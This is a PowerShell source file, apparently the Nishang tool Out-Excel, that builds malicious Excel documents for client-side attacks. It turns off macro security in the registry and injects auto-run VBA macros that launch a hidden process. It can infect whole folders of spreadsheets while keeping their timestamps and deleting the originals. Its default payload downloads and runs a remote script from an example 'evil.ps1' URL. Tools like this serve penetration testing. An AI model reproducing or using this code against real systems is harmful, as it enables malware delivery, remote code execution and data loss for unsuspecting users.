
function Out-Excel
{

<#
.SYNOPSIS
Nishang Script which can generate and "infect" existing excel files with an auto executable macro. 

.DESCRIPTION
The script can create as well as "infect" existing excel files with an auto executable macro. Powershell payloads
could be exeucted using the genereated files. If a folder is passed to the script it can insert macro in all existing excrl
files in the folder. With the Recurse switch, sub-folders can also be included. 
For existing files, a new macro enabled xls file is generated from a xlsx file and for existing .xls files, the macro code is inserted.
LastWriteTime of the xlsx file is set to the newly generated xls file. If the RemoveXlsx switch is enabled, the 
original xlsx is removed and the data in it is lost.

.PARAMETER Payload
Payload which you want execute on the target.

.PARAMETER PayloadURL
URL of the powershell script which would be executed on the target.

.PARAMETER Arguments
Arguments to the powershell script to be executed on the target.

.PARAMETER ExcelFileDir
The directory which contains MS Excel files which are to be "infected".

.PARAMETER OutputFile
The path for the output Excel file. Default is Salary_Details.xls in the current directory.

.PARAMETER Recurse
Recursively look for Excel files in the ExcelFileDir

.PARAMETER RemoveXlsx
When using the ExcelFileDir to "infect" files in a directory, remove the original ones after creating the infected ones.

.PARAMETER RemainSafe
Use this switch to turn on Macro Security on your machine after using Out-Excel.

.EXAMPLE
PS > Out-Excel -Payload "powershell.exe -ExecutionPolicy Bypass -noprofile -noexit -c Get-Process"

Use above command to provide your own payload to be executed from macro. A file named "Salary_Details.xls" would be generated
in user's temp directory.

.EXAMPLE
PS > Out-Excel -PayloadURL http://yourwebserver.com/evil.ps1

Use above when you want to use the default payload, which is a powershell download and execute one-liner. A file 
named "Salary_Details.xls" would be generated in user's temp directory.

.EXAMPLE
PS > Out-Excel -PayloadURL http://yourwebserver.com/evil.ps1 -Arguments Evil

Use above when you want to use the default payload, which is a powershell download and execute one-liner.
The Arugment parameter allows to pass arguments to the downloaded script.

.EXAMPLE
PS > Out-Excel -PayloadURL http://yourwebserver.com/evil.ps1 -OutputFile C:\xlsfiles\Generated.xls

In above, the output file would be saved to the given path.

.EXAMPLE
PS > Out-Excel -PayloadURL http://yourwebserver.com/evil.ps1 -ExcelFileDir C:\xlsfiles\

In above, in the C:\xlsfiles directory, macro enabled .xls files would be created for all the .xlsx files, with the same name
and same Last MOdified Time.

.EXAMPLE
PS > Out-Excel -PayloadURL http://yourwebserver.com/evil.ps1 -ExcelFileDir C:\xlsfiles\ -Recurse

The above command would search recursively for .xlsx files in C:\xlsfiles.

.EXAMPLE
PS > Out-Excel -PayloadURL http://yourwebserver.com/evil.ps1 -ExcelFileDir C:\xlsfiles\ -Recurse -RemoveXlsx

The above command would search recursively for .xlsx files in C:\xlsfiles, generate macro enabled .xls files and
delete the original files.

.EXAMPLE
PS > Out-Excel -PayloadURL http://yourwebserver.com/evil.ps1 -RemainSafe

Out-Excel turns off Macro Security. Use -RemainSafe to turn it back on.


.LINK
http://www.labofapenetrationtester.com/2014/11/powershell-for-client-side-attacks.html
https://github.com/samratashok/nishang
#>


    [CmdletBinding()] Param(
        
        [Parameter(Position=0, Mandatory = $False)]
        [String]
        $Payload,
        
        [Parameter(Position=1, Mandatory = $False)]
        [String]
        $PayloadURL,

        [Parameter(Position=2, Mandatory = $False)]
        [String]
        $Arguments,
        
        [Parameter(Position=3, Mandatory = $False)]
        [String]
        $ExcelFileDir,
        
        [Parameter(Position=4, Mandatory = $False)]
        [String]
        $OutputFile="$pwd\Salary_Details.xls",

        
        [Parameter(Position=5, Mandatory = $False)]
        [Switch]
        $Recurse,
        
        [Parameter(Position=6, Mandatory = $False)]
        [Switch]
        $RemoveXlsx,

        [Parameter(Position=7, Mandatory = $False)]
        [Switch]
        $RemainSafe
    )
    
    #http://stackoverflow.com/questions/21278760/how-to-add-vba-code-in-excel-worksheet-in-powershell
    $Excel = New-Object -ComObject Excel.Application
    $ExcelVersion = $Excel.Version
    #Check for Office 2007 or Office 2003
    if (($ExcelVersion -eq "12.0") -or  ($ExcelVersion -eq "11.0"))
    {
        $Excel.DisplayAlerts = $False
    }
    else
    {
        $Excel.DisplayAlerts = "wdAlertsNone"
    }    
    #Turn off Macro Security
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 1 -Force | Out-Null
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 1 -Force | Out-Null

    if(!$Payload)
    {
        $Payload = "powershell.exe -ExecutionPolicy Bypass -noprofile -c IEX ((New-Object Net.WebClient).DownloadString('$PayloadURL'));$Arguments"
    }
    #Macro Code
    #Macro code from here http://enigma0x3.wordpress.com/2014/01/11/using-a-powershell-payload-in-a-client-side-attack/
    $CodeAuto = @"
    Sub Auto_Open()
    Execute

    End Sub


         Public Function Execute() As Variant
            Const HIDDEN_WINDOW = 0
            strComputer = "."
            Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
         
            Set objStartup = objWMIService.Get("Win32_ProcessStartup")
            Set objConfig = objStartup.SpawnInstance_
            objConfig.ShowWindow = HIDDEN_WINDOW
            Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
            objProcess.Create "$Payload", Null, objConfig, intProcessID
         End Function
"@

    $CodeWorkbook = @"
    Sub Workbook_Open()
    Execute

    End Sub


         Public Function Execute() As Variant
            Const HIDDEN_WINDOW = 0
            strComputer = "."
            Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
         
            Set objStartup = objWMIService.Get("Win32_ProcessStartup")
            Set objConfig = objStartup.SpawnInstance_
            objConfig.ShowWindow = HIDDEN_WINDOW
            Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
            objProcess.Create "$Payload", Null, objConfig, intProcessID
         End Function
"@

  
    if ($ExcelFileDir)
    {
        $ExcelFiles = Get-ChildItem $ExcelFileDir *.xlsx
        if ($Recurse -eq $True)
        {
            $ExcelFiles = Get-ChildItem -Recurse $ExcelFileDir *.xlsx
        }
        ForEach ($ExcelFile in $ExcelFiles)
        {
            $Excel = New-Object -ComObject Excel.Application
            $Excel.DisplayAlerts = $False
            $WorkBook = $Excel.Workbooks.Open($ExcelFile.FullName)
            $ExcelModule = $WorkBook.VBProject.VBComponents.Item(1)
            $ExcelModule.CodeModule.AddFromString($CodeWorkbook)
            $Savepath = $ExcelFile.DirectoryName + "\" + $ExcelFile.BaseName + ".xls"
            #Append .xls to the original file name if file extensions are hidden for known file types.
            if ((Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced).HideFileExt -eq "1")
            {
                $Savepath = $ExcelFile.FullName + ".xls"
            }
            $WorkBook.Saveas($SavePath, 18)
            Write-Output "Saved to file $SavePath"
            $Excel.Workbooks.Close()
            $LastModifyTime = $ExcelFile.LastWriteTime
            $FinalDoc = Get-ChildItem $Savepath
            $FinalDoc.LastWriteTime = $LastModifyTime
            if ($RemoveXlsx -eq $True)
            {
                Write-Output "Deleting $($ExcelFile.FullName)"
                Remove-Item -Path $ExcelFile.FullName
            }
            $Excel.Quit()
            [System.Runtime.Interopservices.Marshal]::ReleaseComObject($Excel)
        }
    }
    else
    {
        $WorkBook = $Excel.Workbooks.Add(1)
        $WorkSheet=$WorkBook.WorkSheets.item(1)
        $ExcelModule = $WorkBook.VBProject.VBComponents.Add(1)
        $ExcelModule.CodeModule.AddFromString($CodeAuto)
        $WorkBook.SaveAs($OutputFile, 18)
        Write-Output "Saved to file $OutputFile"
        $Excel.Workbooks.Close()
        $Excel.Quit()
        [System.Runtime.Interopservices.Marshal]::ReleaseComObject($Excel)
    }

    if ($RemainSafe -eq $True)
    {
        #Turn on Macro Security
        New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\excel\Security" -Name AccessVBOM -Value 0 -Force | Out-Null
        New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\excel\Security" -Name VBAWarnings -Value 0 -Force | Out-Null
    }
}
